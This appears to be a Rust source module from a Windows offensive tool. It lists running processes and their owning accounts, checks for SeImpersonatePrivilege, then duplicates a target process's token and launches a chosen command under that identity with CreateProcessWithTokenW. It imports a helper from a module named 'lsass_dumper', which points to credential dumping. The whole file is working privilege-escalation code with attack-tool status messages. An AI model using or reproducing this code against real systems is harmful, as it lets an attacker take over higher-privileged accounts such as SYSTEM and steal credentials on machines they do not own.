use std::ffi::OsStr;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use winapi::shared::minwindef::{DWORD, FALSE, TRUE};
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::{
    GetCurrentProcess, OpenProcess, OpenProcessToken, STARTUPINFOW, PROCESS_INFORMATION,
};
use winapi::um::securitybaseapi::{DuplicateTokenEx, GetTokenInformation, PrivilegeCheck};
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use winapi::um::winbase::{CreateProcessWithTokenW, LookupAccountSidW, LookupPrivilegeValueW};
use winapi::um::winnt::{
    HANDLE, LUID, PRIVILEGE_SET, PRIVILEGE_SET_ALL_NECESSARY, PROCESS_QUERY_INFORMATION,
    SE_PRIVILEGE_ENABLED, SecurityImpersonation, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_OWNER,
    TOKEN_QUERY, TokenOwner, TokenPrimary,
};

use crate::lsass_dumper::SafeHandle;

const LOGON_WITH_PROFILE: DWORD = 0x00000001;
const CREATE_NEW_CONSOLE: DWORD = 0x00000010;
const CREATE_NEW_PROCESS_GROUP: DWORD = 0x00000200;

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

fn wide_to_string(wide: &[u16]) -> String {
    String::from_utf16_lossy(wide.split(|&c| c == 0).next().unwrap_or(&[]))
}

pub struct ProcessInfo {
    pub pid: u32,
    pub domain_user_name: String,
    pub process_name: String,
}

fn get_process_owner(pid: u32) -> Option<String> {
    unsafe {
        let process = SafeHandle::new(OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid));
        if !process.is_valid() {
            return None;
        }

        let mut token: HANDLE = ptr::null_mut();
        if OpenProcessToken(process.raw(), TOKEN_QUERY, &mut token) == FALSE {
            return None;
        }
        let token = SafeHandle::new(token);

        let mut needed: DWORD = 0;
        GetTokenInformation(token.raw(), TokenOwner, ptr::null_mut(), 0, &mut needed);

        let mut buffer: Vec<u8> = vec![0u8; needed as usize];
        if GetTokenInformation(
            token.raw(),
            TokenOwner,
            buffer.as_mut_ptr() as *mut _,
            needed,
            &mut needed,
        ) == FALSE
        {
            return None;
        }

        let owner = &*(buffer.as_ptr() as *const TOKEN_OWNER);

        let mut user_size: DWORD = 0;
        let mut domain_size: DWORD = 0;
        let mut sid_type: u32 = 0;

        LookupAccountSidW(
            ptr::null(),
            owner.Owner,
            ptr::null_mut(),
            &mut user_size,
            ptr::null_mut(),
            &mut domain_size,
            &mut sid_type as *mut _ as *mut _,
        );

        let mut user_buf: Vec<u16> = vec![0u16; user_size as usize];
        let mut domain_buf: Vec<u16> = vec![0u16; domain_size as usize];

        if LookupAccountSidW(
            ptr::null(),
            owner.Owner,
            user_buf.as_mut_ptr(),
            &mut user_size,
            domain_buf.as_mut_ptr(),
            &mut domain_size,
            &mut sid_type as *mut _ as *mut _,
        ) == FALSE
        {
            return None;
        }

        let domain = wide_to_string(&domain_buf);
        let user = wide_to_string(&user_buf);

        Some(format!("{}\\{}", domain, user))
    }
}

pub fn has_impersonate_privilege() -> bool {
    let priv_name = to_wide("SeImpersonatePrivilege");

    unsafe {
        let mut token: HANDLE = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == FALSE {
            eprintln!("  [-] Failed to open process token");
            return false;
        }
        let token = SafeHandle::new(token);

        let mut luid: LUID = mem::zeroed();
        if LookupPrivilegeValueW(ptr::null(), priv_name.as_ptr(), &mut luid) == FALSE {
            eprintln!("  [-] Failed to lookup privilege");
            return false;
        }

        let mut priv_set: PRIVILEGE_SET = mem::zeroed();
        priv_set.PrivilegeCount = 1;
        priv_set.Control = PRIVILEGE_SET_ALL_NECESSARY;
        priv_set.Privilege[0].Luid = luid;
        priv_set.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

        let mut result: i32 = 0;
        if PrivilegeCheck(token.raw(), &mut priv_set, &mut result) == FALSE {
            eprintln!("  [-] Failed to check privilege");
            return false;
        }

        result != 0
    }
}

pub fn enumerate_processes() -> Vec<ProcessInfo> {
    let mut processes = Vec::new();

    unsafe {
        let snapshot = SafeHandle::new(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
        if !snapshot.is_valid() {
            eprintln!("  [!] Could not list running processes");
            return processes;
        }

        let mut entry: PROCESSENTRY32W = mem::zeroed();
        entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot.raw(), &mut entry) == FALSE {
            return processes;
        }

        loop {
            let pid = entry.th32ProcessID;
            let name = wide_to_string(&entry.szExeFile);

            if let Some(owner) = get_process_owner(pid) {
                processes.push(ProcessInfo {
                    pid,
                    domain_user_name: owner,
                    process_name: name,
                });
            }

            if Process32NextW(snapshot.raw(), &mut entry) == FALSE {
                break;
            }
        }
    }

    processes
}

pub fn impersonate_and_spawn(target_pid: u32, process_to_launch: &str) -> Option<u32> {
    let cmd_wide = to_wide(process_to_launch);
    let mut cmd_buf = cmd_wide.clone();

    unsafe {
        let process = SafeHandle::new(OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, target_pid));
        if !process.is_valid() {
            eprintln!("  [-] Failed to open target process");
            return None;
        }

        let mut token: HANDLE = ptr::null_mut();
        if OpenProcessToken(process.raw(), TOKEN_DUPLICATE, &mut token) == FALSE {
            eprintln!("  [-] Failed to get target process token");
            return None;
        }
        let token = SafeHandle::new(token);

        let mut new_token: HANDLE = ptr::null_mut();
        if DuplicateTokenEx(
            token.raw(),
            TOKEN_ALL_ACCESS,
            ptr::null_mut(),
            SecurityImpersonation,
            TokenPrimary,
            &mut new_token,
        ) == FALSE
        {
            eprintln!("  [-] Failed to duplicate token");
            return None;
        }
        let new_token = SafeHandle::new(new_token);

        let mut si: STARTUPINFOW = mem::zeroed();
        si.cb = mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = mem::zeroed();

        let flags = CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP;

        if CreateProcessWithTokenW(
            new_token.raw(),
            LOGON_WITH_PROFILE,
            ptr::null(),
            cmd_buf.as_mut_ptr(),
            flags,
            ptr::null_mut(),
            ptr::null(),
            &mut si as *mut _ as *mut _,
            &mut pi,
        ) == FALSE
        {
            eprintln!("  [-] Failed to spawn process with token");
            return None;
        }

        let spawned_pid = pi.dwProcessId;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        Some(spawned_pid)
    }
}
